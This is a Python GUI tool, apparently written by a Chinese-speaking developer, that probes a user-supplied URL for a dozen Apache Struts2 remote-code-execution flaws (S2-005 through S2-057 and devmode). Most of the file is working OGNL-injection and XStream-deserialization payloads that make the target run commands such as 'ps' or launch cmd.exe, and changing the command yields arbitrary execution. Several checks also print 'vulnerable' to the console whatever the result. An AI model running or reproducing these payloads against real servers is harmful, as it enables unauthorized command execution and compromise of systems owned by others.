import re
import tkinter as tk
from time import sleep
from tkinter import ttk
from tkinter.scrolledtext import ScrolledText
import requests
from urllib.parse import quote
from urllib.parse import urlparse

def poc(url,timeout,headers,log_text):
    url = url
    poc = {
        "s2-005":'''('%5C43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('%5C43context[%5C'xwork.MethodAccessor.denyMethodExecution%5C']%5C75false')(b))&('%5C43c')(('%5C43_memberAccess.excludeProperties%5C75@java.util.Collections@EMPTY_SET')(c))&(g)(('%5C43req%5C75@org.apache.struts2.ServletActionContext@getRequest()')(d))&(i2)(('%5C43xman%5C75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i2)(('%5C43xman%5C75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i95)(('%5C43xman.getWriter().print(%22S2-005%22)')(d))&(i95)(('%5C43xman.getWriter().println(%5C43req.getRealPath(%22\%22))')(d))&(i99)(('%5C43xman.getWriter().close()')(d))''',
        "s2-008":'''debug=command&expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27echo%20S2-008%27%29.getInputStream%28%29%29)''',
        "s2-009":'''(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%22echo%20S2-009%22).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&z[(name)(%27meh%27)]''',
        "s2-016":'''redirect%3A%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23_memberAccess%2Ctrue)%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%22echo%20S2-016%22).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B5000%5D%2C%23c.read(%23d)%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%23d)%2C%23genxor.flush()%2C%23genxor.close()%7D''',
        "s2-019":'''debug=command&expression=%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%22echo%20S2-019%22).getInputStream())),%23resp.getWriter().flush(),%23resp.getWriter().close()''',
        "s2-032":'''method:%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%2C%23res%3D%40org.apache.struts2.ServletActionContext%40getResponse()%2C%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D)%2C%23w%3D%23res.getWriter()%2C%23a%3Dnew%20java.util.Scanner(%40java.lang.Runtime%40getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.d%5B0%5D)%2C%23str%3D%23a.hasNext()%3F%23a.next()%3A%23parameters.dd%5B0%5D%2C%23w.print(%23str)%2C%23w.close()%2C%23request.toString&cmd=echo%20S2-032&dd=%20&d=____A&encoding=UTF-8''',
        "s2-013":'''a=1${(%23_memberAccess["allowStaticMethodAccess"]=true,%23a=@java.lang.Runtime@getRuntime().exec('ps').getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[50000],%23c.read(%23d),%23sbtest=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23sbtest.println(%23d),%23sbtest.close())}''',
        "s2-006":'''('\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\43context[\'xwork.MethodAccessor.denyMethodExecution\']\75false')(b))&('\43c')(('\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\43mycmd\75\'ps\'')(d))&(h)(('\43myret\75@java.lang.Runtime@getRuntime().exec(\43mycmd)')(d))&(i)(('\43mydat\75new\40java.io.DataInputStream(\43myret.getInputStream())')(d))&(j)(('\43myres\75new\40byte[51020]')(d))&(k)(('\43mydat.readFully(\43myres)')(d))&(l)(('\43mystr\75new\40java.lang.String(\43myres)')(d))&(m)(('\43myout\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(n)(('\43myout.getWriter().println(\43mystr)')(d))'''

    }


    try:
        response = requests.get(url=url, headers=headers, params=poc['s2-005'], timeout=timeout)
        if 'S2-005' in response.text and response.status_code == 200:  # 返回包如果出现S2-005和200响应码即表示存在漏洞
            log_text.insert(tk.END, "[+]" + url + "[存在S2-005漏洞]\n\n",'red')
            print("[+] "+ url +" ----- 存在S2-005漏洞")
        else:
            log_text.insert(tk.END, "[-]"+ url +"[不存在S2-005漏洞]\n\n",'green')
            print("[-] "+ url +" ----- 不存在S2-005漏洞")
    except Exception as out:
        log_text.insert(tk.END, "[-]"+ url +"[检测S2-005超时..]\n\n",'red')
        print("检测S2-005超时..")
        print("超时原因: ", out)



    try:
        response = requests.get(url=url+'?'+poc['s2-008'], headers=headers, timeout=timeout)
        if 'S2-008' in response.text and response.status_code == 200:  # 返回包如果出现S2-008和200响应码即表示存在漏洞
            print("[+] "+ url +" ----- 存在S2-008漏洞")
            log_text.insert(tk.END, "[+]" + url +"[存在S2-008漏洞]\n\n",'red')
        else:
            log_text.insert(tk.END, "[-]"+ url +"[不存在S2-008漏洞]\n\n",'green')
            print("[-] "+ url +" ----- 不存在S2-008漏洞")
    except Exception as out:
        log_text.insert(tk.END, "[-]"+ url +"[检测S2-008超时..]\n\n",'red')
        print("检测S2-008超时..")
        print("超时原因: ", out)


    try:
        response = requests.get(url=url+'?'+poc['s2-009'], headers=headers, timeout=timeout)
        if 'S2-009' in response.text and response.status_code == 200:  # 返回包如果出现S2-009和200响应码即表示存在漏洞
            print("[+] "+ url +"----- 存在S2-009漏洞")
            log_text.insert(tk.END, "[+]"+ url +"[存在S2-009漏洞]\n\n",'red')
        else:
            log_text.insert(tk.END, "[-]"+ url +"[不存在S2-009漏洞]\n\n",'green')
            print("[-] "+ url +" ----- 不存在S2-009漏洞")
    except Exception as out:
        log_text.insert(tk.END, "[-]"+ url +"[检测S2-009超时..]\n\n",'red')
        print("检测S2-009超时..")
        print("超时原因: ", out)


    try:
        response = requests.get(url=url+'?'+poc['s2-016'], headers=headers, timeout=timeout)
        if 'S2-016' in response.text and response.status_code == 200:  # 返回包如果出现S2-016和200响应码即表示存在漏洞
            print("[+] "+ url +" ----- 存在S2-016漏洞")
            log_text.insert(tk.END, "[+]"+ url +"[存在S2-016漏洞]\n\n",'red')
        else:
            print("[-] "+ url +" ----- 不存在S2-016漏洞")
            log_text.insert(tk.END, "[-]"+ url +"[不存在S2-016漏洞]\n\n",'green')
    except Exception as out:
        log_text.insert(tk.END, "[-]"+ url +"[检测S2-016超时..]\n\n",'red')
        print("检测S2-016超时..")
        print("超时原因: ", out)


    try:
        response = requests.get(url=url+'?'+poc['s2-019'], headers=headers, timeout=timeout)
        if 'S2-019' in response.text and response.status_code == 200:  # 返回包如果出现S2-019和200响应码即表示存在漏洞
            print("[+] "+ url +" ----- 存在S2-019漏洞")
            log_text.insert(tk.END, "[+]"+ url +"[存在S2-019漏洞]\n\n",'red')
        else:
            print("[-] "+ url +" ----- 不存在S2-019漏洞")
            log_text.insert(tk.END, "[-]"+ url +"[不存在S2-019漏洞]\n\n",'green')
    except Exception as out:
        log_text.insert(tk.END, "[-]"+ url +"[检测S2-019超时..]\n\n",'red')
        print("检测S2-019超时..")
        print("超时原因: ", out)


    try:
        response = requests.get(url=url+'?'+poc['s2-032'], headers=headers, timeout=timeout)
        if 'S2-032' in response.text and response.status_code == 200:  # 返回包如果出现S2-032和200响应码即表示存在漏洞
            print("[+] "+ url +" ----- 存在S2-032漏洞")
            log_text.insert(tk.END, "[+]"+ url +"[存在S2-032漏洞]\n\n",'red')
        else:
            print("[-] "+ url +" ----- 不存在S2-032漏洞")
            log_text.insert(tk.END, "[-]"+ url +"[不存在S2-032漏洞]\n\n",'green')
    except Exception as out:
        log_text.insert(tk.END, "[-]"+ url +"[检测S2-032超时..]\n\n",'red')
        print("检测S2-032超时..")
        print("超时原因: ", out)

    try:
        response = requests.get(url=url+'?'+poc['s2-013'], headers=headers, timeout=timeout)
        if 'S2-013' in response.text and response.status_code == 200:  # 返回包如果出现S2-032和200响应码即表示存在漏洞
            print("[+] "+ url +" ----- 存在S2-013漏洞")
            log_text.insert(tk.END, "[+]"+ url +"[存在S2-013漏洞]\n\n",'red')
        else:
            print("[-] "+ url +" ----- 不存在S2-013漏洞")
            log_text.insert(tk.END, "[-]"+ url +"[不存在S2-013漏洞]\n\n",'green')
    except Exception as out:
        log_text.insert(tk.END, "[-]"+ url +"[检测S2-013超时..]\n\n",'red')
        print("检测S2-013超时..")
        print("超时原因: ", out)

    try:
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        exp = '''('\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\43context[\'xwork.MethodAccessor.denyMethodExecution\']\75false')(b))&('\43c')(('\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\43mycmd\75\'ps\'')(d))&(h)(('\43myret\75@java.lang.Runtime@getRuntime().exec(\43mycmd)')(d))&(i)(('\43mydat\75new\40java.io.DataInputStream(\43myret.getInputStream())')(d))&(j)(('\43myres\75new\40byte[51020]')(d))&(k)(('\43mydat.readFully(\43myres)')(d))&(l)(('\43mystr\75new\40java.lang.String(\43myres)')(d))&(m)(('\43myout\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(n)(('\43myout.getWriter().println(\43mystr)')(d))'''
        resp = requests.post(url, data=exp, headers=headers, timeout=10)
        if "PID" in resp.text:
            print("[+] "+ url +" ----- 存在S2-006漏洞")
            log_text.insert(tk.END, "[+]"+ url +"[存在S2-006漏洞]\n\n",'red')
        else:
            print("[+] "+ url +" ----- 存在S2-006漏洞")
            log_text.insert(tk.END, "[-]"+ url +"[不存在S2-006漏洞]\n\n",'green')
    except Exception as out:
        log_text.insert(tk.END, "[-]" + url + "[检测S2-006超时..]\n\n", 'red')
        print("检测S2-006超时..")
        print("超时原因: ", out)

    try:
        data = (
            '<map><entry><jdk.nashorn.internal.objects.NativeString> <flags>0</flags> <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"> <dataHandler> <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"><is class="javax.crypto.CipherInputStream"> <cipher class="javax.crypto.NullCipher"> <initialized>false</initialized> <opmode>0</opmode> <serviceIterator class="javax.imageio.spi.FilterIterator"> <iter class="javax.imageio.spi.FilterIterator"> <iter class="java.util.Collections$EmptyIterator"/> <next class="java.lang.ProcessBuilder"> <command> <string>C:/Windows/System32/cmd.exe</string> </command> <redirectErrorStream>false</redirectErrorStream> </next> </iter> <filter class="javax.imageio.ImageIO$ContainsFilter"> <method> <class>java.lang.ProcessBuilder</class> <name>start</name> <parameter-types/> </method> <name>foo</name> </filter> <next class="string">foo</next> </serviceIterator> <lock/> </cipher> <input class="java.lang.ProcessBuilder$NullInputStream"/> <ibuffer></ibuffer> <done>false</done> <ostart>0</ostart> <ofinish>0</ofinish> <closed>false</closed> </is> <consumed>false</consumed> </dataSource> <transferFlavors/> </dataHandler> <dataLen>0</dataLen> </value> </jdk.nashorn.internal.objects.NativeString> <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/> </entry> <entry> <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/> <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/></entry></map>')
        headers = {'Content-type': 'application/xml'}
        res = requests.post(url, headers=headers, data=data)
        body = res.text
        if "java.util.HashMap" in body:
            print("[+] " + url + " ----- 存在S2-052漏洞")
            log_text.insert(tk.END, "[+]"+ url +"[存在S2-052漏洞]\n\n",'red')
        else:
            print("[+] " + url + " ----- 不存在S2-052漏洞")
            log_text.insert(tk.END, "[-]"+ url +"[不存在S2-052漏洞]\n\n",'green')
    except Exception as out:
        log_text.insert(tk.END, "[-]" + url + "[检测S2-052超时..]\n\n", 'red')
        print("检测S2-052超时..")
        print("超时原因: ", out)



    try:
        s2_045poc = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
            "Content-Type": "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo S2-045').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
        }
        response = requests.get(url=url, headers=s2_045poc, timeout=timeout)
        if 'S2-045' in response.text and response.status_code == 200:  # 返回包如果出现S2-045和200响应码即表示存在漏洞
            print("[+] "+ url +" ----- 存在S2-045漏洞")
            log_text.insert(tk.END, "[+]"+ url +"[存在S2-045漏洞]\n\n",'red')
        else:
            print("[-] "+ url +" ----- 不存在S2-045漏洞",'\n')
            log_text.insert(tk.END, "[-]"+ url +"[不存在S2-045漏洞]\n\n",'green')
    except Exception as out:
        log_text.insert(tk.END, "[-]"+ url +"[检测S2-045超时..]\n\n",'red')
        print("检测S2-045超时..")
        print("超时原因: ", out)

    try:
        cmd = r'ps'
        payload = "%{(#_='multipart/form-data')."
        payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
        payload += "(#_memberAccess?(#_memberAccess=#dm):"
        payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
        payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
        payload += "(#ognlUtil.getExcludedPackageNames().clear())."
        payload += "(#ognlUtil.getExcludedClasses().clear())."
        payload += "(#context.setMemberAccess(#dm))))."
        payload += "(#cmd='%s')." % cmd
        payload += "(#iswin=(@java.lang.System@getProperty('os.name')."
        payload += "toLowerCase().contains('win')))."
        payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
        payload += "(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true))."
        payload += "(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream(),'UTF-8'))}"
        payload = quote(payload)
        resp = requests.get(r'{}/?name={}'.format(url, payload))
        if "PID" in resp.text:
            print("[+] " + url + " ----- 存在S2-053漏洞")
            log_text.insert(tk.END, "[+]"+ url +"[存在S2-053漏洞]\n\n",'red')
        else:
            print("[+] " + url + " ----- 不存在S2-053漏洞")
            log_text.insert(tk.END, "[-]"+ url +"[不存在S2-053漏洞]\n\n",'green')
    except Exception as out:
        log_text.insert(tk.END, "[-]" + url + "[检测S2-053超时..]\n\n", 'red')
        print("检测S2-053超时..")
        print("超时原因: ", out)



    try:
        url1 = urlparse(url)
        domainorip = url1.netloc
        url = domainorip.split(':')[0]
        potorl = url1.scheme
        path = url1.path
        port = url1.port
        newurl = potorl + '://' + url + ':' + str(port) + '/'
        payload = "%24%7B%0A%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23a%3D%40java.lang.Runtime%40getRuntime%28%29.exec%28%27ps%27%29%29.%28%40org.apache.commons.io.IOUtils%40toString%28%23a.getInputStream%28%29%29%29%7D/actionChain1.action"
        url = newurl + payload + path
        res = requests.get(url, allow_redirects=False)
        if 'PID' in res.text:
            print("[+] " + url + " ----- 存在S2-057漏洞")
            log_text.insert(tk.END, "[+]"+ url +"[存在S2-057漏洞]\n\n",'red')
        else:
            print("[+] " + url + " ----- 不存在S2-057漏洞")
            log_text.insert(tk.END, "[-]"+ url +"[不存在S2-057漏洞]\n\n",'green')
    except Exception as out:
        log_text.insert(tk.END, "[-]" + url + "[检测S2-057超时..]\n\n", 'red')
        print("检测S2-057超时..")
        print("超时原因: ", out)


    try:
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        exp = '''?debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context[%23parameters.rpsobj[0]].getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()))):xx.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=123456789&command=ps'''
        url += exp
        resp = requests.get(url, headers=headers, timeout=10)
        if "PID" in resp.text:
            print("[+] " + url + " ----- 存在S2-dev漏洞")
            log_text.insert(tk.END, "[+]"+ url +"[存在S2-dev漏洞]\n\n",'red')
        else:
            print("[+] " + url + " ----- 不存在S2-dev漏洞")
            log_text.insert(tk.END, "[-]"+ url +"[不存在S2-dev漏洞]\n\n",'green')
    except Exception as out:
        log_text.insert(tk.END, "[-]" + url + "[检测S2-dev超时..]\n\n", 'red')
        print("检测S2-dev超时..")
        print("超时原因: ", out)


    log_text.insert(tk.END, "===========检测结束=============",'green')
    print("========================检测结束===========================")
    print('\n')


def is_valid_url(url):
    url_regex = re.compile(
        r'^(?:http|ftp)s?://'  # http:// or https://  
        r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|'  # domain...  
        r'localhost|'  # localhost...  
        r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})'  # ...or ip (v4) address  
        r'(?::\d+)?'  # optional port  
        r'(?:/?|[/?]\S+)$', re.IGNORECASE)
    return url is not None and url_regex.match(url)



def start_scan(log_text,input_URL,input_Cookie):
    clear_log(log_text)
    log_text.config(state=tk.NORMAL)
    log_text.insert(tk.END, '开始扫描...................' + "\n\n")
    url = input_URL.get()
    url = url.strip()  # 去除两端的空白字符
    if is_valid_url(url):
        log_text.insert(tk.END, "URL有效: " + url + "\n\n")
        print("这是一个有效的URL。")
    else:
        log_text.insert(tk.END, "这不是一个有效的URL" + url + "\n\n")
        print("这不是一个有效的URL。")
        return
    cookie = input_Cookie.get()
    print(f"URL: {url}")
    print(f"Cookie: {cookie}")
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36',
        }
    poc(url,2,headers,log_text)





    log_text.config(state=tk.DISABLED)  # 设置为只读状态


def clear_log(log_text):
    log_text.config(state=tk.NORMAL)  # 设置为可编辑状态
    log_text.delete("1.0", tk.END)  # 清空文本框内容
    log_text.config(state=tk.DISABLED)  # 设置为只读状态
    print("清空")


def center_window(root, width, height):
    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()
    x = (screen_width - width) // 2
    y = (screen_height - height) // 2
    root.geometry(f'{width}x{height}+{x}+{y}')



def main_window():
    root = tk.Tk()
    root.title('漏洞扫描')
    # 设置窗口大小为800x500，并禁止调整大小
    root.geometry('800x500')  # 设置窗口大小
    root.resizable(False, False)  # 禁止水平和垂直调整大小
    center_window(root, 530, 600)

    # 使用grid布局
    label_URL = ttk.Label(root, text="URL:", font=("Courier", 12))
    label_URL.grid(row=0, column=0, padx=5, pady=10, sticky="e")

    input_URL = ttk.Entry(root, font=("Helvetica", 10))
    input_URL.grid(row=0, column=1, padx=5, pady=10, sticky='w')
    input_URL.config(width=30)

    button_scan = ttk.Button(root, text="开始扫描", command=lambda: start_scan(log_text,input_URL,input_Cookie))
    button_scan.grid(row=0, column=2, padx=5, pady=10, sticky='w')

    label_Cookie = ttk.Label(root, text="Cookie:", font=("Courier", 12))
    label_Cookie.grid(row=1, column=0, padx=5, pady=10, sticky="e")

    input_Cookie = ttk.Entry(root, font=("Helvetica", 10))
    input_Cookie.grid(row=1, column=1, padx=5, pady=10, sticky='w')
    #input_Cookie.config(width=40)
    button_clear = ttk.Button(root, text="清空", command=lambda: clear_log(log_text))
    button_clear.grid(row=1, column=2, padx=5, pady=10, sticky='w')

    # 记录框
    # 创建现代化风格的多行文本编辑框
    log_text = ScrolledText(root, wrap=tk.WORD, width=62, height=27, font=("宋体", 12))
    log_text.grid(row=2, column=0, columnspan=3, padx=10, pady=10)

    # 配置标签来设置文本颜色
    log_text.tag_config('red', foreground='red')
    log_text.tag_config('green', foreground='green')

    root.mainloop()

























